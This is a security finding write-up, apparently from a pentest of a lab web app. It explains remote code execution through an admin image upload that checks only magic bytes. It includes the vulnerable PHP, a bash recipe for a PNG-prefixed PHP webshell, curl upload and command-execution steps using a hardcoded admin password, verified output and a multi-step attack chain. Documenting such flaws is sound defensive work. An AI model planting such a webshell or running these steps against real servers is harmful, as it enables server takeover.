# 16 — Remote code execution via the admin image upload

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** Critical
- **Difficulty:** Medium

## Where

`web/panel/upload.php:22-34` — `POST /panel/upload.php`
(`require_admin()` **and** a re-check of the admin password):

```php
$tmp = $_FILES['file']['tmp_name'];
$fh = fopen($tmp, 'r');
$magic = fread($fh, 16);
fclose($fh);
$isimg = false;
if (substr($magic, 0, 8) == "\x89PNG\r\n\x1a\n") $isimg = true;   // PNG
if (substr($magic, 0, 3) == "\xFF\xD8\xFF")      $isimg = true;   // JPEG
if (substr($magic, 0, 4) == 'GIF8')              $isimg = true;   // GIF
if (!$isimg) { $err = '...'; } else {
    $name = basename($_FILES['file']['name']);
    move_uploaded_file($tmp, UPLOAD_DIR . $name);
}
```

## How it works (root cause)

The only validation is a **magic-byte sniff of the first few bytes**. There
is **no file-extension filter** and no re-encoding. So a file that *starts*
with a valid PNG/JPEG/GIF signature but *is* a `.php` script passes the
check and is written to the web root (`web/uploads/`) with its attacker-chosen
name. Nginx's `location ~ \.php$` routes any `.php` under the web root to
php-fpm, so the uploaded file is executed.

The 8 magic bytes before `<?php` are simply emitted as output; PHP then
executes the script.

## Exploitation steps

1. Build a polyglot: PNG header + PHP webshell.

   ```bash
   printf '\x89PNG\r\n\x1a\n' > pwn.php
   printf '<?php system($_GET["c"]); ?>' >> pwn.php
   ```

2. Authenticate as admin (any of: SQLi in 03, the hinted password in 08, or
   the stolen session in 15) and re-supply the admin password (line 17):

   ```bash
   curl -s -b /tmp/admin.jar \
     -F "upload_password=Aragorn2025!" \
     -F "file=@pwn.php;filename=pwn.php" \
     http://localhost:8080/panel/upload.php
   ```

3. Execute:

   ```bash
   curl -s 'http://localhost:8080/uploads/pwn.php?c=id'
   # uid=1000(user) gid=1000(user) groups=1000(user)
   ```

## Working PoC (verified)

`web/uploads/pwn.php` exists (82 bytes) and
`/uploads/pwn.php?c=id > /tmp/osede_upload_pwned` produced:

```
uid=1000(user) gid=1000(user) groups=1000(user)
```

— RCE as the PHP-FPM user.

## Expected result / verification

- A `.php` file appears in `web/uploads/`.
- Requesting it with a command parameter executes the command.

## Attack chain

```
admin access (03 SQLi / 08 note hint / 15 XSS)
  → upload a PNG-prefixed .php webshell
  → nginx executes it → RCE
  → (or) the shell + osede_app ALL PRIVILEGES → MySQL UDF RCE (19)
```

## Notes

- `basename()` (line 33) stops path traversal in the *name*, but it does not
  stop a `.php` extension — which is exactly what makes this exploitable.
- The password re-check (line 17) is a second admin secret; combined with
  unsalted MD5 (22) and the leaked hint (08) it is not a real barrier.
